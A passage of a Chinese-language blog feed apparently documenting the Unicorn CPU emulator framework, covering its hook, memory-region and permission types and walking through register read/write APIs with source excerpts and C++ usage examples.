class="number">1</span> &lt;&lt; <span class="number">14</span>,</span><br><span class="line">&#125; uc_hook_type;</span><br></pre></td></tr></table></figure></div><h3 id="宏定义Hook类型"><a href="#宏定义Hook类型" class="headerlink" title="宏定义Hook类型"></a>宏定义Hook类型</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Hook 所有未映射内存访问的事件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UC_HOOK_MEM_UNMAPPED (UC_HOOK_MEM_READ_UNMAPPED + UC_HOOK_MEM_WRITE_UNMAPPED + UC_HOOK_MEM_FETCH_UNMAPPED)</span></span><br><span class="line"><span class="comment">// Hook 所有对受保护内存的非法访问事件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UC_HOOK_MEM_PROT (UC_HOOK_MEM_READ_PROT + UC_HOOK_MEM_WRITE_PROT + UC_HOOK_MEM_FETCH_PROT)</span></span><br><span class="line"><span class="comment">// Hook 所有非法读取存储器的事件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UC_HOOK_MEM_READ_INVALID (UC_HOOK_MEM_READ_PROT + UC_HOOK_MEM_READ_UNMAPPED)</span></span><br><span class="line"><span class="comment">// Hook 所有非法写入存储器的事件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UC_HOOK_MEM_WRITE_INVALID (UC_HOOK_MEM_WRITE_PROT + UC_HOOK_MEM_WRITE_UNMAPPED)</span></span><br><span class="line"><span class="comment">// Hook 所有非法获取内存的事件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UC_HOOK_MEM_FETCH_INVALID (UC_HOOK_MEM_FETCH_PROT + UC_HOOK_MEM_FETCH_UNMAPPED)</span></span><br><span class="line"><span class="comment">// Hook 所有非法的内存访问事件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UC_HOOK_MEM_INVALID (UC_HOOK_MEM_UNMAPPED + UC_HOOK_MEM_PROT)</span></span><br><span class="line"><span class="comment">// Hook 所有有效内存访问的事件</span></span><br><span class="line"><span class="comment">// 注意: UC_HOOK_MEM_READ 在 UC_HOOK_MEM_READ_PROT 和 UC_HOOK_MEM_READ_UNMAPPED 之前触发 , </span></span><br><span class="line"><span class="comment">//       因此这个Hook可能会触发一些无效的读取。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UC_HOOK_MEM_VALID (UC_HOOK_MEM_READ + UC_HOOK_MEM_WRITE + UC_HOOK_MEM_FETCH)</span></span><br></pre></td></tr></table></figure></div><h3 id="uc-mem-region"><a href="#uc-mem-region" class="headerlink" title="uc_mem_region"></a>uc_mem_region</h3><p>由uc_mem_map()和uc_mem_map_ptr()映射内存区域<br>使用uc_mem_regions()检索该内存区域的列表</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">uc_mem_region</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> begin; <span class="comment">// 区域起始地址 (包括)</span></span><br><span class="line">    <span class="keyword">uint64_t</span> end;   <span class="comment">// 区域结束地址 (包括)</span></span><br><span class="line">    <span class="keyword">uint32_t</span> perms; <span class="comment">// 区域的内存权限</span></span><br><span class="line">&#125; uc_mem_region;</span><br></pre></td></tr></table></figure></div><h3 id="uc-query-type"><a href="#uc-query-type" class="headerlink" title="uc_query_type"></a>uc_query_type</h3><p>uc_query()的所有查询类型参数</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> uc_query_type &#123;</span><br><span class="line">    <span class="comment">// 动态查询当前硬件模式</span></span><br><span class="line">    UC_QUERY_MODE = <span class="number">1</span>,</span><br><span class="line">    UC_QUERY_PAGE_SIZE,</span><br><span class="line">    UC_QUERY_ARCH,</span><br><span class="line">&#125; uc_query_type;</span><br></pre></td></tr></table></figure></div><h3 id="uc-context"><a href="#uc-context" class="headerlink" title="uc_context"></a>uc_context</h3><p>与uc_context_*()一起使用，管理CPU上下文的不透明存储</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uc_context</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">uc_context</span> <span class="title">uc_context</span>;</span></span><br></pre></td></tr></table></figure></div><h3 id="uc-prot"><a href="#uc-prot" class="headerlink" title="uc_prot"></a>uc_prot</h3><p>新映射区域的权限</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> uc_prot &#123;</span><br><span class="line">   UC_PROT_NONE = <span class="number">0</span>,    <span class="comment">//无</span></span><br><span class="line">   UC_PROT_READ = <span class="number">1</span>,    <span class="comment">//读取</span></span><br><span class="line">   UC_PROT_WRITE = <span class="number">2</span>,   <span class="comment">//写入</span></span><br><span class="line">   UC_PROT_EXEC = <span class="number">4</span>,    <span class="comment">//可执行</span></span><br><span class="line">   UC_PROT_ALL = <span class="number">7</span>,     <span class="comment">//所有权限</span></span><br><span class="line">&#125; uc_prot;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Unicorn-CPU模拟框架数据类型及API分析与示例-一&quot;&gt;&lt;a href=&quot;#Unicorn-CPU模拟框架数据类型及API分析与示例-一&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Unicorn-CPU模拟框架数据类型及API分析与示例(三)</title>
    <link href="https://kabeor.github.io/Unicorn-CPU%E6%A8%A1%E6%8B%9F%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E4%B8%8E%E7%A4%BA%E4%BE%8B(%E4%B8%89)/"/>
    <id>https://kabeor.github.io/Unicorn-CPU%E6%A8%A1%E6%8B%9F%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E4%B8%8E%E7%A4%BA%E4%BE%8B(%E4%B8%89)/</id>
    <published>2020-02-12T16:00:00.000Z</published>
    <updated>2020-03-16T04:50:54.571Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Unicorn-CPU模拟框架数据类型及API分析与示例-三"><a href="#Unicorn-CPU模拟框架数据类型及API分析与示例-三" class="headerlink" title="Unicorn-CPU模拟框架数据类型及API分析与示例(三)"></a>Unicorn-CPU模拟框架数据类型及API分析与示例(三)</h1><h2 id="0x2-API分析"><a href="#0x2-API分析" class="headerlink" title="0x2 API分析"></a>0x2 API分析</h2><h3 id="uc-reg-write"><a href="#uc-reg-write" class="headerlink" title="uc_reg_write"></a>uc_reg_write</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_write</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> regid, <span class="keyword">const</span> <span class="keyword">void</span> *value)</span></span>;</span><br></pre></td></tr></table></figure></div><p>将值写入寄存器</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open()返回的句柄</span><br><span class="line">@regid:  将被修改的寄存器ID</span><br><span class="line">@value:  指向寄存器将被修改成的值的指针</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_write</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> regid, <span class="keyword">const</span> <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> uc_reg_write_batch(uc, &amp;regid, (<span class="keyword">void</span> *<span class="keyword">const</span> *)&amp;value, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">uc_err <span class="title">uc_reg_write_batch</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> *ids, <span class="keyword">void</span> *<span class="keyword">const</span> *vals, <span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = UC_ERR_OK;</span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;reg_write)</span><br><span class="line">        ret = uc-&gt;reg_write(uc, (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)ids, vals, count);    <span class="comment">//结构体中写入</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> UC_ERR_EXCEPTION; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line"></span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例创建成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> r_eax = <span class="number">0x12</span>;</span><br><span class="line">    err = uc_reg_write(uc, UC_X86_REG_ECX, &amp;r_eax);</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"写入成功: "</span> &lt;&lt; r_eax &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    err = uc_close(uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_close() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例关闭成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出</p><p><a href="https://i.loli.net/2020/01/19/DkztJcigHCdmnRp.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/19/DkztJcigHCdmnRp.png" class="lazyload"></a></p><h3 id="uc-reg-read"><a href="#uc-reg-read" class="headerlink" title="uc_reg_read"></a>uc_reg_read</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_read</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> regid, <span class="keyword">void</span> *value)</span></span>;</span><br></pre></td></tr></table></figure></div><p>读取寄存器的值</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open()返回的句柄</span><br><span class="line">@regid:  将被读取的寄存器ID</span><br><span class="line">@value:  指向保存寄存器值的指针</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_read</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> regid, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> uc_reg_read_batch(uc, &amp;regid, &amp;value, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">uc_err <span class="title">uc_reg_read_batch</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> *ids, <span class="keyword">void</span> **vals, <span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;reg_read)</span><br><span class="line">        uc-&gt;reg_read(uc, (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)ids, vals, count);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line"></span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例创建成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> r_eax = <span class="number">0x12</span>;</span><br><span class="line">    err = uc_reg_write(uc, UC_X86_REG_ECX, &amp;r_eax);</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"写入成功: "</span> &lt;&lt; r_eax &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> recv_eax;</span><br><span class="line">    err = uc_reg_read(uc, UC_X86_REG_ECX, &amp;recv_eax);</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"读取成功: "</span> &lt;&lt; recv_eax &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    err = uc_close(uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_close() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例关闭成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出</p><p><a href="https://i.loli.net/2020/01/19/ABkexFCfphu3zIg.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/19/ABkexFCfphu3zIg.png" class="lazyload"></a></p><h3 id="uc-reg-write-batch"><a href="#uc-reg-write-batch" class="headerlink" title="uc_reg_write_batch"></a>uc_reg_write_batch</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_write_batch</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> *regs, <span class="keyword">void</span> *<span class="keyword">const</span> *vals, <span class="keyword">int</span> count)</span></span>;</span><br></pre></td></tr></table></figure></div><p>同时将多个值写入多个寄存器</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open()返回的句柄</span><br><span class="line">@regid:  存储将被写入的多个寄存器ID的数组</span><br><span class="line">@value:  指向保存多个值的数组的指针</span><br><span class="line">@count: *regs 和 *vals 数组的长度</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_write_batch</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> *ids, <span class="keyword">void</span> *<span class="keyword">const</span> *vals, <span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = UC_ERR_OK;</span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;reg_write)</span><br><span class="line">        ret = uc-&gt;reg_write(uc, (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)ids, vals, count);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> UC_ERR_EXCEPTION; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> syscall_abi[] = &#123;</span><br><span class="line">    UC_X86_REG_RAX, UC_X86_REG_RDI, UC_X86_REG_RSI, UC_X86_REG_RDX,</span><br><span class="line">    UC_X86_REG_R10, UC_X86_REG_R8, UC_X86_REG_R9</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> vals[<span class="number">7</span>] = &#123; <span class="number">200</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* ptrs[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    uc_err err;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set up register pointers</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        ptrs[i] = &amp;vals[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_open(UC_ARCH_X86, UC_MODE_64, &amp;uc))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_open"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reg_write_batch</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"reg_write_batch(&#123;200, 10, 11, 12, 13, 14, 15&#125;)\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> ((err = uc_reg_write_batch(uc, syscall_abi, ptrs, <span class="number">7</span>))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_reg_write_batch"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reg_read_batch</span></span><br><span class="line">    <span class="built_in">memset</span>(vals, <span class="number">0</span>, <span class="keyword">sizeof</span>(vals));</span><br><span class="line">    <span class="keyword">if</span> ((err = uc_reg_read_batch(uc, syscall_abi, ptrs, <span class="number">7</span>))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_reg_read_batch"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"reg_read_batch = &#123;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">", "</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%"</span> PRIu64, vals[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&#125;\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> var[<span class="number">7</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; syscall_abi[i] &lt;&lt; <span class="string">"   "</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%"</span> PRIu64, vals[i]);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出</p><p><a href="https://i.loli.net/2020/01/19/l1AhdxgKE2U3tZB.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/19/l1AhdxgKE2U3tZB.png" class="lazyload"></a></p><h3 id="uc-reg-read-batch"><a href="#uc-reg-read-batch" class="headerlink" title="uc_reg_read_batch"></a>uc_reg_read_batch</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_read_batch</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> *regs, <span class="keyword">void</span> **vals, <span class="keyword">int</span> count)</span></span>;</span><br></pre></td></tr></table></figure></div><p>同时读取多个寄存器的值。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open()返回的句柄</span><br><span class="line">@regid:  存储将被读取的多个寄存器ID的数组</span><br><span class="line">@value:  指向保存多个值的数组的指针</span><br><span class="line">@count: *regs 和 *vals 数组的长度</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_read_batch</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> *ids, <span class="keyword">void</span> **vals, <span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;reg_read)</span><br><span class="line">        uc-&gt;reg_read(uc, (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)ids, vals, count);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例同uc_reg_write_batch()。</p><h3 id="uc-mem-write"><a href="#uc-mem-write" class="headerlink" title="uc_mem_write"></a>uc_mem_write</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_write</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">const</span> <span class="keyword">void</span> *bytes, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span>;</span><br></pre></td></tr></table></figure></div><p>在内存中写入一段字节码。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" 